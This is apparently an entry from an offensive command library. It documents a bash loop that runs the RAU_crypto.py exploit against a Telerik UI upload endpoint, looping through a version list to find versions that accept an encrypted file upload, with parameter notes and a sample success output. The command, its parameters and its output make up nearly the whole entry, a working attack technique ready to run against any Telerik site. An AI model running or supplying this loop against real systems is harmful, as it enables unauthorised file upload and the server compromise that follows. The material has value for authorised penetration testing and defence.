---
data: >-
  for VERSION in $(cat versions.txt); do echo -n "$VERSION: "; python3
  RAU_crypto.py -P 'password' "$VERSION" testfile.txt
  https://target.com/app/Telerik.Web.UI.WebResource.axd?type=rau 2>/dev/null |
  grep fileInfo || echo; done
tags:
  - bruteforce
  - recon
type: command
output: >-
  2017.2.621:
  {"fileInfo":{"FileName":"RAU_crypto.bypass","ContentType":"text/html","ContentLength":5,"DateJson":"..."}}
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:37.418Z'
id: 878b175f-3265-4e5c-9db2-e7bf200792b4
verified: false
validated: true
submitted: true
---
# for-loop-bruteforce-versions

## Command

```bash
for VERSION in $(cat versions.txt); do echo -n "$VERSION: "; python3 RAU_crypto.py -P 'password' "$VERSION" testfile.txt https://target.com/app/Telerik.Web.UI.WebResource.axd?type=rau 2>/dev/null | grep fileInfo || echo; done
```

## Description

Bash loop to test Telerik versions by attempting uploads with RAU_crypto, identifying vulnerable ones via fileInfo grep.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `versions.txt` | File with version list | Yes |
| `-P 'password'` | Encryption password | Yes |
| `testfile.txt` | File to upload | Yes |
| URL | Target endpoint | Yes |
| `2>/dev/null` | Suppress errors | Yes |
| `| grep fileInfo` | Filter success | Yes |

## Examples

### Basic Usage

```bash
for VERSION in $(cat versions.txt); do ... done
```

### Advanced Usage

Add timeout: `timeout 5 python3 RAU_crypto.py ...`

## Expected Output

Vulnerable version prefixed with successful JSON fileInfo.

## Related

- [[procedures/Identify-Vulnerable-Telerik-Version]]
